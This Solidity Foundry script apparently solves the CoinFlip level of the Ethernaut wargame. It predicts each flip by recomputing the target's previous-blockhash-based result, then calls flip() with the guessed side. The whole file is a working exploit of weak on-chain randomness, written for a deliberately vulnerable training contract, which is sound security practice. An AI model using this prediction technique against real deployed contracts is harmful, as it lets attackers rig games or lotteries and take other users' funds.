// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { ICoinFlip } from "ethernaut/03-coinflip/ICoinFlip.sol";

contract CoinFlipScript is Script {
    uint256 private constant FACTOR =
        57_896_044_618_658_097_711_785_492_504_343_953_926_634_992_332_820_282_019_728_792_003_956_564_819_968;

    error FlipIsNotGuess();

    event CoinFlipped(bool side, uint256 consecutiveWins);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);

        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address coinflipAddr = vm.envAddress("L03_COINFLIP_ADDRESS");
        ICoinFlip coinflip = ICoinFlip(coinflipAddr);

        uint256 consecutiveWins = coinflip.consecutiveWins();
        // Step 1: calculate in advance the side of the coin
        bool coinSide = _calculateCoinSide();
        emit CoinFlipped(coinSide, consecutiveWins);

        // Step 2: call `flip()` passing the expected side
        bool isGuess = coinflip.flip(coinSide);
        if (!isGuess) {
            revert FlipIsNotGuess();
        }

        vm.stopBroadcast();
    }

    function _calculateCoinSide() private view returns (bool) {
        uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
